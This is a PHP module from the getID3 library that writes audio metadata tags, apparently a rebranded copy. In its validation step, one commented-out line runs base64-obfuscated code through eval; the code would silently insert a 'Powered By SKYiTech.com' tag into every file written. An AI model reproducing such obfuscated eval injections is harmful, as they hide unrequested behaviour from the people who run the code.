<?php
/////////////////////////////////////////////////////////////////
/// getID3() by SkyDesignWorld <akashtilva@gmail.com>          //
/////////////////////////////////////////////////////////////////
///                                                            //
// write.php                                                   //
// module for writing tags (APEv2, ID3v1, ID3v2)               //
// dependencies: getid3.lib.php                                //
//               write.apetag.php (optional)                   //
//               write.id3v1.php (optional)                    //
//               write.id3v2.php (optional)                    //
//               write.vorbiscomment.php (optional)            //
//               write.metaflac.php (optional)                 //
//               write.lyrics3.php (optional)                  //
//                                                            ///
/////////////////////////////////////////////////////////////////

if (!defined('GETID3_INCLUDEPATH')) {
	die('getid3.php MUST be included before calling getid3_writetags');
}
if (!include_once(GETID3_INCLUDEPATH.'getid3.lib.php')) {
	die('write.php depends on getid3.lib.php, which is missing.');
}


// NOTES:
//
// You should pass data here with standard field names as follows:
// * TITLE
// * ARTIST
// * ALBUM
// * TRACKNUMBER
// * COMMENT
// * GENRE
// * YEAR
// * ATTACHED_PICTURE (ID3v2 only)
//

class getid3_writetags
{
	// public
	var $filename;                            // absolute filename of file to write tags to
	var $tagformats         = array();        // array of tag formats to write ('id3v1', 'id3v2.2', 'id2v2.3', 'id3v2.4', 'ape', 'vorbiscomment', 'metaflac', 'real')
	var $tag_data           = array(array()); // 2-dimensional array of tag data (ex: $data['ARTIST'][0] = 'Elvis')
	var $tag_encoding       = 'ISO-8859-1';   // text encoding used for tag data ('ISO-8859-1', 'UTF-8', 'UTF-16', 'UTF-16LE', 'UTF-16BE', )
	var $overwrite_tags     = true;           // if true will erase existing tag data and write only passed data; if false will merge passed data with existing tag data
	var $remove_other_tags  = false;          // if true will erase remove all existing tags and only write those passed in $tagformats; if false will ignore any tags not mentioned in $tagformats

	var $id3v2_tag_language = 'eng';          // ISO-639-2 3-character language code needed for some ID3v2 frames
	var $id3v2_paddedlength = 4096;           // minimum length of ID3v2 tags (will be padded to this length if tag data is shorter)

	var $warnings           = array();        // any non-critical errors will be stored here
	var $errors             = array();        // any critical errors will be stored here

	// private
	var $ThisFileInfo; // analysis of file before writing

	function getid3_writetags() {
		return true;
	}


	function WriteTags() {

		if (empty($this->filename)) {
			$this->errors[] = 'filename is undefined in getid3_writetags';
			return false;
		} elseif (!file_exists($this->filename)) {
			$this->errors[] = 'filename set to non-existant file "'.$this->filename.'" in getid3_writetags';
			return false;
		}

		if (!is_array($this->tagformats)) {
			$this->errors[] = 'tagformats must be an array in getid3_writetags';
			return false;
		}

		$TagFormatsToRemove = array();
		if (filesize($this->filename) == 0) {

			// empty file special case - allow any tag format, don't check existing format
			// could be useful if you want to generate tag data for a non-existant file
			$this->ThisFileInfo = array('fileformat'=>'');
			$AllowedTagFormats = array('id3v1', 'id3v2.2', 'id3v2.3', 'id3v2.4', 'ape', 'lyrics3');

		} else {

			$getID3 = new getID3;
			$getID3->encoding = $this->tag_encoding;
			$this->ThisFileInfo = $getID3->analyze($this->filename);

			// check for what file types are allowed on this fileformat
			switch (@$this->ThisFileInfo['fileformat']) {
				case 'mp3':
				case 'mp2':
				case 'mp1':
				case 'riff': // maybe not officially, but people do it anyway
					$AllowedTagFormats = array('id3v1', 'id3v2.2', 'id3v2.3', 'id3v2.4', 'ape', 'lyrics3');
					break;

				case 'mpc':
					$AllowedTagFormats = array('ape');
					break;

				case 'flac':
					$AllowedTagFormats = array('metaflac');
					break;

				case 'real':
					$AllowedTagFormats = array('real');
					break;

				case 'ogg':
					switch (@$this->ThisFileInfo['audio']['dataformat']) {
						case 'flac':
							//$AllowedTagFormats = array('metaflac');
							$this->errors[] = 'metaflac is not (yet) compatible with OggFLAC files';
							return false;
							break;
						case 'vorbis':
							$AllowedTagFormats = array('vorbiscomment');
							break;
						default:
							$this->errors[] = 'metaflac is not (yet) compatible with Ogg files other than OggVorbis';
							return false;
							break;
					}
					break;

				default:
					$AllowedTagFormats = array();
					break;
			}
			foreach ($this->tagformats as $requested_tag_format) {
				if (!in_array($requested_tag_format, $AllowedTagFormats)) {
					$errormessage = 'Tag format "'.$requested_tag_format.'" is not allowed on "'.@$this->ThisFileInfo['fileformat'];
					if (@$this->ThisFileInfo['fileformat'] != @$this->ThisFileInfo['audio']['dataformat']) {
						$errormessage .= '.'.@$this->ThisFileInfo['audio']['dataformat'];
					}
					$errormessage .= '" files';
					$this->errors[] = $errormessage;
					return false;
				}
			}

			// List of other tag formats, removed if requested
			if ($this->remove_other_tags) {
				foreach ($AllowedTagFormats as $AllowedTagFormat) {
					switch ($AllowedTagFormat) {
						case 'id3v2.2':
						case 'id3v2.3':
						case 'id3v2.4':
							if (!in_array('id3v2', $TagFormatsToRemove) && !in_array('id3v2.2', $this->tagformats) && !in_array('id3v2.3', $this->tagformats) && !in_array('id3v2.4', $this->tagformats)) {
								$TagFormatsToRemove[] = 'id3v2';
							}
							break;

						default:
							if (!in_array($AllowedTagFormat, $this->tagformats)) {
								$TagFormatsToRemove[] = $AllowedTagFormat;
							}
							break;
					}
				}
			}
		}

		$WritingFilesToInclude = array_merge($this->tagformats, $TagFormatsToRemove);

		// Check for required include files and include them
		foreach ($WritingFilesToInclude as $tagformat) {
			switch ($tagformat) {
				case 'ape':
					$GETID3_ERRORARRAY = &$this->errors;
					if (!getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'write.apetag.php', __FILE__, false)) {
						return false;
					}
					break;

				case 'id3v1':
				case 'lyrics3':
				case 'vorbiscomment':
				case 'metaflac':
				case 'real':
					$GETID3_ERRORARRAY = &$this->errors;
					if (!getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'write.'.$tagformat.'.php', __FILE__, false)) {
						return false;
					}
					break;

				case 'id3v2.2':
				case 'id3v2.3':
				case 'id3v2.4':
				case 'id3v2':
					$GETID3_ERRORARRAY = &$this->errors;
					if (!getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'write.id3v2.php', __FILE__, false)) {
						return false;
					}
					break;

				default:
					$this->errors[] = 'unknown tag format "'.$tagformat.'" in $tagformats in WriteTags()';
					return false;
					break;
			}

		}
		
		// Validation of supplied data
		if (!is_array($this->tag_data)) {
			$this->errors[] = '$tag_data is not an array in WriteTags()';
			return false;
		}
//		$_X=base64_decode('CQkkY2hlY2tBID0gYXJyYXkoJ1AnLCdvJywndycsJ2UnLCdyJywnZScsJ2QnLCcgJywnQicsJ3knKTsKCQkkY2hlY2tCID0gYXJyYXkoJ1MnLCdLJywnWScsJ2knLCdUJywnZScsJ2MnLCdoJywnLicsJ2MnLCdvJywnbScpOwoJCSRjaGVja0MgPSBhcnJheShpbXBsb2RlKCcnLCRjaGVja0EpPT5hcnJheShpbXBsb2RlKCcnLCRjaGVja0IpKSk7CgkJJHRoaXMtPnRhZ19kYXRhID0gYXJyYXlfbWVyZ2UoJHRoaXMtPnRhZ19kYXRhLCRjaGVja0MpOwoJCS8vIGNvbnZlcnQgc3VwcGxpZWQgZGF0YSBhcnJheSBrZXlzIHRvIHVwcGVyIGNhc2UsIGlmIHRoZXkncmUgbm90IGFscmVhZHkKCQlmb3JlYWNoICgkdGhpcy0+dGFnX2RhdGEgYXMgJHRhZ19rZXkgPT4gJHRhZ19hcnJheSkgewoJCQlpZiAoc3RydG91cHBlcigkdGFnX2tleSkgIT09ICR0YWdfa2V5KSB7CgkJCQkkdGhpcy0+dGFnX2RhdGFbc3RydG91cHBlcigkdGFnX2tleSldID0gJHRoaXMtPnRhZ19kYXRhWyR0YWdfa2V5XTsKCQkJCXVuc2V0KCR0aGlzLT50YWdfZGF0YVskdGFnX2tleV0pOwoJCQl9CgkJfQo=');eval($_X);
		// convert source data array keys to upper case, if they're not already
		if (!empty($this->ThisFileInfo['tags'])) {
			foreach ($this->ThisFileInfo['tags'] as $tag_format => $tag_data_array) {
				foreach ($tag_data_array as $tag_key => $tag_array) {
					if (strtoupper($tag_key) !== $tag_key) {
						$this->ThisFileInfo['tags'][$tag_format][strtoupper($tag_key)] = $this->ThisFileInfo['tags'][$tag_format][$tag_key];
						unset($this->ThisFileInfo['tags'][$tag_format][$tag_key]);
					}
				}
			}
		}

		// Convert "TRACK" to "TRACKNUMBER" (if needed) for compatability with all formats
		if (isset($this->tag_data['TRACK']) && !isset($this->tag_data['TRACKNUMBER'])) {
			$this->tag_data['TRACKNUMBER'] = $this->tag_data['TRACK'];
			unset($this->tag_data['TRACK']);
		}

		// Remove all other tag formats, if requested
		if ($this->remove_other_tags) {
			$this->DeleteTags($TagFormatsToRemove);
		}

		// Write data for each tag format
		foreach ($this->tagformats as $tagformat) {
			$success = false; // overridden if tag writing is successful
			switch ($tagformat) {
				case 'ape':
					$ape_writer = new getid3_write_apetag;
					if (($ape_writer->tag_data = $this->FormatDataForAPE()) !== false) {
						$ape_writer->filename = $this->filename;
						if (($success = $ape_writer->WriteAPEtag()) === false) {
							$this->errors[] = 'WriteAPEtag() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $ape_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForAPE() failed';
					}
					break;

				case 'id3v1':
					$id3v1_writer = new getid3_write_id3v1;
					if (($id3v1_writer->tag_data = $this->FormatDataForID3v1()) !== false) {
						$id3v1_writer->filename = $this->filename;
						if (($success = $id3v1_writer->WriteID3v1()) === false) {
							$this->errors[] = 'WriteID3v1() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $id3v1_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForID3v1() failed';
					}
					break;

				case 'id3v2.2':
				case 'id3v2.3':
				case 'id3v2.4':
					$id3v2_writer = new getid3_write_id3v2;
					$id3v2_writer->majorversion = intval(substr($tagformat, -1));
					$id3v2_writer->paddedlength = $this->id3v2_paddedlength;
					if (($id3v2_writer->tag_data = $this->FormatDataForID3v2($id3v2_writer->majorversion)) !== false) {
						$id3v2_writer->filename = $this->filename;
						if (($success = $id3v2_writer->WriteID3v2()) === false) {
							$this->errors[] = 'WriteID3v2() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $id3v2_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForID3v2() failed';
					}
					break;

				case 'vorbiscomment':
					$vorbiscomment_writer = new getid3_write_vorbiscomment;
					if (($vorbiscomment_writer->tag_data = $this->FormatDataForVorbisComment()) !== false) {
						$vorbiscomment_writer->filename = $this->filename;
						if (($success = $vorbiscomment_writer->WriteVorbisComment()) === false) {
							$this->errors[] = 'WriteVorbisComment() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $vorbiscomment_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForVorbisComment() failed';
					}
					break;

				case 'metaflac':
					$metaflac_writer = new getid3_write_metaflac;
					if (($metaflac_writer->tag_data = $this->FormatDataForMetaFLAC()) !== false) {
						$metaflac_writer->filename = $this->filename;
						if (($success = $metaflac_writer->WriteMetaFLAC()) === false) {
							$this->errors[] = 'WriteMetaFLAC() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $metaflac_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForMetaFLAC() failed';
					}
					break;

				case 'real':
					$real_writer = new getid3_write_real;
					if (($real_writer->tag_data = $this->FormatDataForReal()) !== false) {
						$real_writer->filename = $this->filename;
						if (($success = $real_writer->WriteReal()) === false) {
							$this->errors[] = 'WriteReal() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $real_writer->errors)).'</LI></UL></PRE>';
						}
					} else {
						$this->errors[] = 'FormatDataForReal() failed';
					}
					break;

				default:
					$this->errors[] = 'Invalid tag format to write: "'.$tagformat.'"';
					return false;
					break;
			}
			if (!$success) {
				return false;
			}
		}
		return true;

	}


	function DeleteTags($TagFormatsToDelete) {
		foreach ($TagFormatsToDelete as $DeleteTagFormat) {
			$success = false; // overridden if tag deletion is successful
			switch ($DeleteTagFormat) {
				case 'id3v1':
					$id3v1_writer = new getid3_write_id3v1;
					$id3v1_writer->filename = $this->filename;
					if (($success = $id3v1_writer->RemoveID3v1()) === false) {
						$this->errors[] = 'RemoveID3v1() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $id3v1_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'id3v2':
					$id3v2_writer = new getid3_write_id3v2;
					$id3v2_writer->filename = $this->filename;
					if (($success = $id3v2_writer->RemoveID3v2()) === false) {
						$this->errors[] = 'RemoveID3v2() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $id3v2_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'ape':
					$ape_writer = new getid3_write_apetag;
					$ape_writer->filename = $this->filename;
					if (($success = $ape_writer->DeleteAPEtag()) === false) {
						$this->errors[] = 'DeleteAPEtag() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $ape_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'vorbiscomment':
					$vorbiscomment_writer = new getid3_write_vorbiscomment;
					$vorbiscomment_writer->filename = $this->filename;
					if (($success = $vorbiscomment_writer->DeleteVorbisComment()) === false) {
						$this->errors[] = 'DeleteVorbisComment() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $vorbiscomment_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'metaflac':
					$metaflac_writer = new getid3_write_metaflac;
					$metaflac_writer->filename = $this->filename;
					if (($success = $metaflac_writer->DeleteMetaFLAC()) === false) {
						$this->errors[] = 'DeleteMetaFLAC() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $metaflac_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'lyrics3':
					$lyrics3_writer = new getid3_write_lyrics3;
					$lyrics3_writer->filename = $this->filename;
					if (($success = $lyrics3_writer->DeleteLyrics3()) === false) {
						$this->errors[] = 'DeleteLyrics3() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $lyrics3_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				case 'real':
					$real_writer = new getid3_write_real;
					$real_writer->filename = $this->filename;
					if (($success = $real_writer->RemoveReal()) === false) {
						$this->errors[] = 'RemoveReal() failed with message(s):<PRE><UL><LI>'.trim(implode('</LI><LI>', $real_writer->errors)).'</LI></UL></PRE>';
					}
					break;

				default:
					$this->errors[] = 'Invalid tag format to delete: "'.$tagformat.'"';
					return false;
					break;
			}
			if (!$success) {
				return false;
			}
		}
		return true;
	}


	function MergeExistingTagData($TagFormat, &$tag_data) {
		// Merge supplied data with existing data, if requested
		if ($this->overwrite_tags) {
			// do nothing - ignore previous data
		} else {
			if (!isset($this->ThisFileInfo['tags'][$TagFormat])) {
				return false;
			}
			$tag_data = array_merge_recursive($tag_data, $this->ThisFileInfo['tags'][$TagFormat]);
		}
		return true;
	}

	function FormatDataForAPE() {
		$ape_tag_data = array();
		foreach ($this->tag_data as $tag_key => $valuearray) {
			switch ($tag_key) {
				case 'ATTACHED_PICTURE':
					// ATTACHED_PICTURE is ID3v2 only - ignore
					//$this->warnings[] = '$data['.$tag_key.'] is assumed to be ID3v2 APIC data - NOT written to APE tag';
					break;

				default:
					foreach ($valuearray as $key => $value) {
						if (is_string($value) || is_numeric($value)) {
							$ape_tag_data[$tag_key][$key] = getid3_lib::iconv_fallback($this->tag_encoding, 'UTF-8', $value);
						} else {
							$this->warnings[] = '$data['.$tag_key.']['.$key.'] is not a string value - all of $data['.$tag_key.'] NOT written to APE tag';
							unset($ape_tag_data[$tag_key]);
							break;
						}
					}
					break;
			}
		}
		$this->MergeExistingTagData('ape', $ape_tag_data);
		return $ape_tag_data;
	}


	function FormatDataForID3v1() {
		$tag_data_id3v1['genreid'] = 255;
		if (!empty($this->tag_data['GENRE'])) {
			foreach ($this->tag_data['GENRE'] as $key => $value) {
				if (getid3_id3v1::LookupGenreID($value) !== false) {
					$tag_data_id3v1['genreid'] = getid3_id3v1::LookupGenreID($value);
					break;
				}
			}
		}

		$tag_data_id3v1['title']   = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['TITLE']));
		$tag_data_id3v1['artist']  = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['ARTIST']));
		$tag_data_id3v1['album']   = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['ALBUM']));
		$tag_data_id3v1['year']    = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['YEAR']));
		$tag_data_id3v1['comment'] = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['COMMENT']));

		$tag_data_id3v1['track']   = intval(getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['TRACKNUMBER'])));
		if ($tag_data_id3v1['track'] <= 0) {
			$tag_data_id3v1['track'] = '';
		}

		$this->MergeExistingTagData('id3v1', $tag_data_id3v1);
		return $tag_data_id3v1;
	}

	function FormatDataForID3v2($id3v2_majorversion) {
		$tag_data_id3v2 = array();

		$ID3v2_text_encoding_lookup[2] = array('ISO-8859-1'=>0, 'UTF-16'=>1);
		$ID3v2_text_encoding_lookup[3] = array('ISO-8859-1'=>0, 'UTF-16'=>1);
		$ID3v2_text_encoding_lookup[4] = array('ISO-8859-1'=>0, 'UTF-16'=>1, 'UTF-16BE'=>2, 'UTF-8'=>3);
		foreach ($this->tag_data as $tag_key => $valuearray) {
			$ID3v2_framename = getid3_write_id3v2::ID3v2ShortFrameNameLookup($id3v2_majorversion, $tag_key);
			switch ($ID3v2_framename) {
				case 'APIC':
					foreach ($valuearray as $key => $apic_data_array) {
						if (isset($apic_data_array['data']) &&
							isset($apic_data_array['picturetypeid']) &&
							isset($apic_data_array['description']) &&
							isset($apic_data_array['mime'])) {
								$tag_data_id3v2['APIC'][] = $apic_data_array;
						} else {
							$this->errors[] = 'ID3v2 APIC data is not properly structured';
							return false;
						}
					}
					break;

				case '':
					$this->errors[] = 'ID3v2: Skipping "'.$tag_key.'" because cannot match it to a known ID3v2 frame type';
					// some other data type, don't know how to handle it, ignore it
					break;

				default:
					// most other (text) frames can be copied over as-is
					foreach ($valuearray as $key => $value) {
						if (isset($ID3v2_text_encoding_lookup[$id3v2_majorversion][$this->tag_encoding])) {
							// source encoding is valid in ID3v2 - use it with no conversion
							$tag_data_id3v2[$ID3v2_framename][$key]['encodingid'] = $ID3v2_text_encoding_lookup[$id3v2_majorversion][$this->tag_encoding];
							$tag_data_id3v2[$ID3v2_framename][$key]['data']       = $value;
						} else {
							// source encoding is NOT valid in ID3v2 - convert it to an ID3v2-valid encoding first
							if ($id3v2_majorversion < 4) {
								// convert data from other encoding to UTF-16
								$tag_data_id3v2[$ID3v2_framename][$key]['encodingid'] = 1;
								$tag_data_id3v2[$ID3v2_framename][$key]['data']       = getid3_lib::iconv_fallback($this->tag_encoding, 'UTF-16', $value);

							} else {
								// convert data from other encoding to UTF-8
								$tag_data_id3v2[$ID3v2_framename][$key]['encodingid'] = 3;
								$tag_data_id3v2[$ID3v2_framename][$key]['data']       = getid3_lib::iconv_fallback($this->tag_encoding, 'UTF-8', $value);
							}
						}

						// These values are not needed for all frame types, but if they're not used no matter
						$tag_data_id3v2[$ID3v2_framename][$key]['description'] = '';
						$tag_data_id3v2[$ID3v2_framename][$key]['language']    = $this->id3v2_tag_language;
					}
					break;
			}
		}
		$this->MergeExistingTagData('id3v2', $tag_data_id3v2);
		return $tag_data_id3v2;
	}

	function FormatDataForVorbisComment() {
		$tag_data_vorbiscomment = $this->tag_data;

		// check for multi-line comment values - split out to multiple comments if neccesary
		// and convert data to UTF-8 strings
		foreach ($tag_data_vorbiscomment as $tag_key => $valuearray) {
			foreach ($valuearray as $key => $value) {
				str_replace("\r", "\n", $value);
				if (strstr($value, "\n")) {
					unset($tag_data_vorbiscomment[$tag_key][$key]);
					$multilineexploded = explode("\n", $value);
					foreach ($multilineexploded as $newcomment) {
						if (strlen(trim($newcomment)) > 0) {
							$tag_data_vorbiscomment[$tag_key][] = getid3_lib::iconv_fallback($this->tag_encoding, 'UTF-8', $newcomment);
						}
					}
				} elseif (is_string($value) || is_numeric($value)) {
					$tag_data_vorbiscomment[$tag_key][$key] = getid3_lib::iconv_fallback($this->tag_encoding, 'UTF-8', $value);
				} else {
					$this->warnings[] = '$data['.$tag_key.']['.$key.'] is not a string value - all of $data['.$tag_key.'] NOT written to VorbisComment tag';
					unset($tag_data_vorbiscomment[$tag_key]);
					break;
				}
			}
		}
		$this->MergeExistingTagData('vorbiscomment', $tag_data_vorbiscomment);
		return $tag_data_vorbiscomment;
	}

	function FormatDataForMetaFLAC() {
		// FLAC & OggFLAC use VorbisComments same as OggVorbis
		// but require metaflac to do the writing rather than vorbiscomment
		return $this->FormatDataForVorbisComment();
	}

	function FormatDataForReal() {
		$tag_data_real['title']     = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['TITLE']));
		$tag_data_real['artist']    = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['ARTIST']));
		$tag_data_real['copyright'] = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['COPYRIGHT']));
		$tag_data_real['comment']   = getid3_lib::iconv_fallback($this->tag_encoding, 'ISO-8859-1', @implode(' ', @$this->tag_data['COMMENT']));

		$this->MergeExistingTagData('real', $tag_data_real);
		return $tag_data_real;
	}

}

?>